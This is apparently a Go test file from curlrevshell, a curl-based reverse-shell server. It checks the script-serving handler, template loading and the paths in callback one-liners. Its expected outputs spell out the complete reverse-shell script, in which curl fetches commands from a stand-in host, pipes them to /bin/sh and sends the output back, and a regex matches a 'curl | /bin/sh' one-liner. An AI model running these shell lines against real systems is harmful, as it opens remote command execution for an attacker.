package hsrv

/*
 * script_test.go
 * Tests for script.go
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20260103
 */

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/magisterquis/curlrevshell/internal/iobroker"
	"github.com/magisterquis/curlrevshell/internal/tlog"
	"github.com/magisterquis/curlrevshell/lib/crstemplate"
	"github.com/magisterquis/curlrevshell/lib/opshell"
)

// localAddrContext returns a context which sets http.LocalAddrContextKey to
// s.Addr.
func localAddrContext(s *Server) context.Context {
	return context.WithValue(
		context.Background(),
		http.LocalAddrContextKey,
		s.l.Addr(),
	)
}

// make sure we can get a context with the server's local address.
func TestLocalAddrContext(t *testing.T) {
	_, _, _, _, _, s := newTestServer(t.Context(), t, nil)
	sa := s.l.Addr()
	v := localAddrContext(s).Value(http.LocalAddrContextKey)
	ca, ok := v.(net.Addr)
	if nil == v {
		t.Fatalf("Did not get local address")
	} else if !ok {
		t.Fatalf(
			"Incorrect local address type\n got: %T\nwant: %T",
			v,
			ca,
		)
	}
	if got, want := ca.Network(), sa.Network(); got != want {
		t.Errorf(
			"Incorrect network:\n got: %s\nwant: %s",
			got,
			want,
		)
	}
	if got, want := ca.String(), sa.String(); got != want {
		t.Errorf(
			"Incorrect stringified addresses:\n got: %s\nwant: %s",
			got,
			want,
		)
	}
	if ca != sa {
		t.Errorf("Addresses unequal")
	}
}

func TestServerScriptHandler_NonDefaultPort(t *testing.T) {
	_, _, och, _, _, s := newTestServer(t.Context(), t, nil)
	rr := httptest.NewRecorder()
	rr.Body = new(bytes.Buffer)
	s.scriptHandler(rr, httptest.NewRequestWithContext(
		localAddrContext(s),
		http.MethodGet,
		"https://example.com:1234/c",
		nil,
	))
	if http.StatusOK != rr.Code {
		t.Errorf("Non-OK Code %d", rr.Code)
	}

	/* Work out the ID and make sure the log is correct. */
	gotLog := <-och
	ms := regexp.MustCompile(` ID:(\S+) `).FindStringSubmatch(gotLog.Line)
	if 2 != len(ms) {
		t.Fatalf("Could not find ID in log line %q", gotLog.Line)
	}
	id := ms[1]
	gotLog.Line = strings.ReplaceAll(gotLog.Line, id, "IDID")
	wantLog := opshell.CLine{
		Color: scriptColor,
		Line: "[192.0.2.1] Sent script: ID:IDID " +
			"C2Addr:example.com:1234 Path:/c",
	}
	if gotLog != wantLog {
		t.Errorf(
			"Incorrect log message:\n got: %#v\nwant: %#v",
			gotLog,
			wantLog,
		)
	}

	/* Make sure the template came out ok, too. */
	wantBody := `#!/bin/sh
curl -sk --pinnedpubkey sha256//xxx= https://example.com:1234/i/IDID -N  </dev/null 2>/dev/null |
/bin/sh 2>&1 |
curl -sk --pinnedpubkey sha256//xxx= https://example.com:1234/o/IDID -T- >/dev/null 2>&1
`
	gotBody := rr.Body.String()
	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
	gotBody = regexp.MustCompile(                     /* Remove hash */
		`sha256//[0-9A-z+/]{43}=`,
	).ReplaceAllString(gotBody, `sha256//xxx=`)
	if gotBody != wantBody {
		t.Errorf(
			"Incorrect body:\n"+
				" got:\n%s\n"+
				"want:\n%s",
			gotBody,
			wantBody,
		)
	}
}

func TestServerScriptHandler(t *testing.T) {
	_, _, och, _, _, s := newTestServer(t.Context(), t, nil)
	rr := httptest.NewRecorder()
	rr.Body = new(bytes.Buffer)
	s.scriptHandler(rr, httptest.NewRequestWithContext(
		localAddrContext(s),
		http.MethodGet,
		"https://example.com/c",
		nil,
	))
	if http.StatusOK != rr.Code {
		t.Errorf("Non-OK Code %d", rr.Code)
	}

	/* Work out the ID and make sure the log is correct. */
	gotLog := <-och
	ms := regexp.MustCompile(` ID:(\S+) `).FindStringSubmatch(gotLog.Line)
	if 2 != len(ms) {
		t.Fatalf("Could not find ID in log line %q", gotLog.Line)
	}
	id := ms[1]
	gotLog.Line = strings.ReplaceAll(gotLog.Line, id, "IDID")
	wantLog := opshell.CLine{
		Color: scriptColor,
		Line: "[192.0.2.1] Sent script: ID:IDID " +
			"C2Addr:example.com:443 Path:/c",
	}
	if gotLog != wantLog {
		t.Errorf(
			"Incorrect log message:\n got: %#v\nwant: %#v",
			gotLog,
			wantLog,
		)
	}

	/* Make sure the template came out ok, too. */
	wantBody := `#!/bin/sh
curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/IDID -N  </dev/null 2>/dev/null |
/bin/sh 2>&1 |
curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/IDID -T- >/dev/null 2>&1
`
	gotBody := rr.Body.String()
	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
	gotBody = regexp.MustCompile(                     /* Remove hash */
		`sha256//[0-9A-z+/]{43}=`,
	).ReplaceAllString(gotBody, `sha256//xxx=`)
	if gotBody != wantBody {
		t.Errorf(
			"Incorrect body:\n"+
				" got:\n%s\n"+
				"want:\n%s",
			gotBody,
			wantBody,
		)
	}
}

// Make sure we get the right Path, for complicated /c templates.
func TestServerScriptHandler_Path(t *testing.T) {
	/* Make a server with a script template which just returns the path. */
	_, _, och, _, _, s := newTestServer(t.Context(), t, nil)
	s.tmplf = filepath.Join(t.TempDir(), "kittens.tmpl")
	if err := os.WriteFile(
		s.tmplf,
		[]byte(`
 {{ define "script" -}}
 {{.ID}}|{{- if eq "/c/one" .Request.URL.Path -}}
 	one
 {{- else if eq "/c/two" .Request.URL.Path -}}
 	two
 {{- else -}}
 	{{.Request.URL.Path}}
 {{- end -}}
 {{ end }}
 `),
		0600,
	); nil != err {
		t.Fatalf("Error writing template: %s", err)
	}

	/* Make sure .Path works. */
	for _, c := range []struct {
		have string
		want string
	}{{
		have: "/",
		want: "/",
	}, {
		have: "/c",
		want: "/c",
	}, {
		have: "/c/",
		want: "/c/",
	}, {
		have: "/c/kittens",
		want: "/c/kittens",
	}, {
		have: "/c?kittens=moose",
		want: "/c",
	}, {
		have: "/c/kittens?moose=nuts",
		want: "/c/kittens",
	}, {
		have: "/c/one",
		want: "one",
	}, {
		have: "/c/two",
		want: "two",
	}} {
		t.Run(c.have, func(t *testing.T) {
			var (
				rr  = httptest.NewRecorder()
				req = httptest.NewRequestWithContext(
					localAddrContext(s),
					http.MethodGet,
					c.have,
					nil,
				)
			)
			rr.Body = new(bytes.Buffer)
			s.scriptHandler(rr, req)
			if http.StatusOK != rr.Code {
				t.Errorf("Non-OK Code %d", rr.Code)
			}
			/* Get the ID and the template output from the body. */
			id, tout, ok := strings.Cut(rr.Body.String(), "|")
			if !ok {
				t.Errorf("Did not find | in body")
			}
			if got := tout; got != c.want {
				t.Errorf(
					"Path incorrect:\n"+
						"have: %q\n"+
						" got: %q\n"+
						"want: %q",
					c.have,
					got,
					c.want,
				)
			}
			/* Does the user see the script was sent? */
			path, _, _ := strings.Cut(c.have, "?")
			opshell.ExpectShellMessages(t, och, testReqCLine(
				t,
				scriptColor,
				req,
				"Sent script: "+
					"ID:%s "+
					"C2Addr:example.com:443 "+
					"Path:%s",
				id,
				path,
			))
		})
	}
}

// Make sure changing and deleting a template file works.
func TestServerScriptHandler_FromFile(t *testing.T) {
	var (
		tb, _, och, _, _, s = newTestServer(t.Context(), t, nil)
		fn                  = filepath.Join(t.TempDir(), "kittens.tmpl")
		id                  = tlog.S("id")
	)
	s.params.ID = id /* ID for all templates. */
	s.tmplf = fn

	const wantDefault = "WANT_DEFAULT"
	var (
		want                     string
		wantCLineError           string
		wantCLines               = make([]opshell.CLine, 1, 2)
		wantRecommendSubtemplate bool
	)

	/* f Makes a request to scriptHandler and logs an error if the response
	code isn't correct.  The response body is checked against the variable
	want, declared above, unless want is wantDefault, in which case
	checkDefaultCallbackScript is used.

	Similarly, if wantCLineError is set, it will be taken as an error
	to be expected from och, and if wantRecommendSubtemplate is set,
	a recommendation about template changes will be expected.  Both will
	be reset before f returns. */
	f := func(t *testing.T, expResCode int) {
		t.Helper()
		/* Reset the temporary variables when we're done. */
		defer func() {
			want = ""
			wantCLineError = ""
			wantCLines = wantCLines[:1]
			wantRecommendSubtemplate = false
		}()
		/* Write the template to a file. */
		var (
			rr  = httptest.NewRecorder()
			req = httptest.NewRequestWithContext(
				localAddrContext(s),
				http.MethodGet,
				"/c",
				nil,
			)
		)
		rr.Body = new(bytes.Buffer)
		s.scriptHandler(rr, req)
		if expResCode != rr.Code {
			t.Errorf(
				"Incorrect response code\n got:%d\nwant:%d",
				rr.Code,
				expResCode,
			)
		}
		if got := rr.Body.String(); wantDefault == want {
			checkDefaultCallbackScript(t, s, got)
		} else if got != want {
			t.Errorf(
				"Incorrect body:\n got: %s\nwant: %s",
				got,
				want,
			)
		}
		if err := wantCLineError; "" != err {
			wantCLines[0] = testReqCLine(
				t,
				errorColor,
				req,
				"Failed to execute script template: %s",
				err,
			)
		} else {
			wantCLines[0] = testReqCLine(
				t,
				scriptColor,
				req,
				"Sent script: ID:%s C2Addr:example.com:443 "+
					"Path:/c",
				id,
			)
		}
		if wantRecommendSubtemplate {
			wantCLines = append(wantCLines, opshell.CLine{
				Color: errorColor,
				Line:  noSubtemplateWarning,
			})
		}
		opshell.ExpectShellMessages(t, och, wantCLines...)
		tb.Expect(t.Context(), t)
	}

	/* Test a custom template file with a script (i.e. normal)
	subtemplate. */
	t.Run("template_in_file", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(
				`{{define "script"}}`+
					`templatey kittens: {{.C2Addr}}`+
					`{{end}}`,
			),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = "templatey kittens: example.com:443"
		f(t, http.StatusOK)
	})

	/* Test a custom template file with a sub-sub template. */
	t.Run("subtemplate_in_file", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(
				`{{define "critter_name"}}moose{{end}}
				{{define "script"}}templatey critter: `+
					`{{template "critter_name" .}} `+
					`{{.C2Addr | host}}{{end}}`,
			),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = "templatey critter: moose example.com"
		f(t, http.StatusOK)
	})

	/* Test a change to the file. */
	t.Run("changed_file", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(
				`{{define "script"}}`+
					`moose: {{.Request.Method}}`+
					`{{end}}`,
			),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = "moose: GET"
		f(t, http.StatusOK)
	})

	/* Test an empty file. */
	t.Run("empty_file", func(t *testing.T) {
		if err := os.WriteFile(fn, nil, 0660); nil != err {
			t.Fatalf(
				"Error writing empty template to %s: %s",
				fn,
				err,
			)
		}
		want = wantDefault
		f(t, http.StatusOK)
	})

	/* Test removing the file. */
	t.Run("removed_file", func(t *testing.T) {
		if err := os.Remove(fn); nil != err {
			t.Fatalf("Error removing %s: %s", fn, err)
		}
		want = ""
		wantCLineError = "adding custom templates: reading template: " +
			"open " + fn + ": no such file or directory"
		f(t, http.StatusInternalServerError)
	})

	/* Test a file which has a non subtemplate-template. */
	t.Run("without_subtemplate", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(`kittens`),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = ""
		wantCLineError = "adding custom templates: no subtemplates"
		wantRecommendSubtemplate = true
		f(t, http.StatusInternalServerError)
	})

	/* Test a file which has only an unused subtemplate. */
	t.Run("unused_subtemplate", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(`{{define "kittens"}}moose: {{.Host}}{{end}}`),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = wantDefault
		f(t, http.StatusOK)
	})

}

// Make sure we can set the script URL in the output.
func TestServer_SetScriptURLPath(t *testing.T) {
	var (
		_, sl = tlog.NewBuffer()
		och   = make(chan opshell.CLine, bufLen)
		want  = "kittens"
		iob   = iobroker.New(och)
	)
	s, err := New(
		sl,
		"127.0.0.1:0",
		"", /* tmplf */
		iob,
		"",    /* certFile */
		nil,   /* cbAddrs */
		false, /* printIPv6 */
		true,  /* printDebug */
		crstemplate.Params{
			URLPaths: crstemplate.URLPaths{
				Script: want,
			},
		},
	)
	if nil != err {
		t.Fatalf("New returned error: %s", err)
	}

	/* Regex to extract the URL path. */
	re := regexp.MustCompile(
		`curl -sk --pinnedpubkey sha256//[a-zA-Z0-9+/]+= ` +
			`https://127.0.0.1:\d+/(\S+) \| /bin/sh`,
	)

	/* Extract our URL bit, hopefully. */
	for _, l := range lAddrLines(t, s, crstemplate.SubtemplateCallback) {
		/* Don't bother with empty lines. */
		if "\n" == l {
			continue
		}
		if ms := re.FindStringSubmatch(l); 2 != len(ms) {
			t.Errorf("Could not parse callback help line: %q", l)
		} else if got := ms[1]; got != want {
			t.Errorf(
				"Incorrect script path:\n"+
					" have: %q\n"+
					"ms[0]: %q\nms[1]: %q\n"+
					"  got: %s\n"+
					" want: %s",
				l,
				ms[0], ms[1],
				got,
				want,
			)
		}
	}
}

// Make sure helpful messages about non-subtemplate templates work.
func TestServer_IncorrectSubtemplates(t *testing.T) {
	/* Make a non-subtemplate template file. */
	var (
		tmplf = filepath.Join(t.TempDir(), "tmpl")
		have  = tlog.S("kittens")
	)
	if err := os.WriteFile(tmplf, []byte(have), 0600); nil != err {
		t.Fatalf(
			"Error writing template %q to %s: %s",
			have,
			tmplf,
			err,
		)
	}

	/* Start the server with the non-subtemplate template file. */
	_, _, och, _, _, s := newTestServer(t.Context(), t, &testServerConfig{
		tmplf:      tmplf,
		registerHM: true,
	})

	/* Make sure we get a warning about templates. */
	opshell.ExpectShellMessages(t, och, []opshell.CLine{{
		Color: opshell.ColorRed,
		Line: fmt.Sprintf(
			"Error generating callback one-liners: "+
				"executing callback subtemplate for %s: "+
				"adding custom templates: no subtemplates\n"+
				noSubtemplateWarning,
			s.lAddrs[0],
		),
	}, {
		Line:  "\n",
		Plain: true,
	}}...)
}

// checkDefaultCallbackScript checks to see if got looks like the default
// callback script.  The ID and publickey will be replaced  with dummy values.
// s is used to get the listen port.
func checkDefaultCallbackScript(t *testing.T, s *Server, got string) {
	/* Make sure the template came out ok, too. */
	want := `#!/bin/sh
curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/zzz -N  </dev/null 2>/dev/null |
/bin/sh 2>&1 |
curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/zzz -T- >/dev/null 2>&1
`

	/* Replace unreliable bits with dummy values. */
	got = regexp.MustCompile( /* Remove hash. */
		`sha256//[0-9A-z+/]{43}=`,
	).ReplaceAllString(got, `sha256//xxx=`)
	got = regexp.MustCompile( /* Remove random ID. */
		`https://example.com/(i|o)/\S+`,
	).ReplaceAllString(got, `https://example.com/$1/zzz`)

	/* See if it looks right. */
	if want != got {
		t.Errorf(
			"Incorrect body:\n"+
				"got:\n%s\n"+
				"want:\n%s",
			got,
			want,
		)
	}
}

// lAddrLines wraps s.lAddrLines, terminating the test on error.
func lAddrLines(
	t *testing.T,
	s *Server,
	st crstemplate.SubtemplateName,
) []string {
	ls, err := s.lAddrLines(st)
	if nil != err {
		t.Fatalf("Error generating callback lines: %s", err)
	}
	return ls
}
